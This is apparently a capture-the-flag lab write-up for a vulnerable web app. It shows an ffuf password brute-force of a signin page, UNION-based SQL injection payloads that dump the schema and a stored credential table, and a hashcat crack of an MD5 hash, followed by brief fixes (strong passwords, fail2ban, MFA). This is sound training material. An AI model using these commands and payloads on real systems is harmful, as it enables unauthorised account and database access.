# How

We can bruteforce the login page at `?page=signin` with a tool like `ffuf`:

```
$ ffuf -u 'http://192.168.122.233/?page=signin&username=admin&password=FUZZ&Login=Login#' -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -fs 1994
[...]
shadow     [Status: 200, Size: 2090, Words: 87, Lines: 55, Duration: 1ms]
```

Alternatively, we could use the SQL injections to dump the
different databases and extract the password for this user:

in `?page=searchimg`:

Dump schema information:

```
id=9 UNION SELECT CONCAT(table_schema,table_name),column_name FROM information_schema.columns-- -
```

Extract data from the db_default table in the Member_Brute_Force DB:

```
id=9 UNION SELECT username,password FROM Member_Brute_Force.db_default-- -
```

Crack the hash with `hashcat`:

```
$ hashcat -m 0 3bf1114a986ba87ed28fc1b5884fc2f8 /usr/share/wordlists/rockyou.txt
[...]
3bf1114a986ba87ed28fc1b5884fc2f8:shadow
[...]
```

# Fix

- Enforce strong passwords
- Setup `fail2ban` to mitigate bruteforcing attempts
- Use Multi Factor Authentication
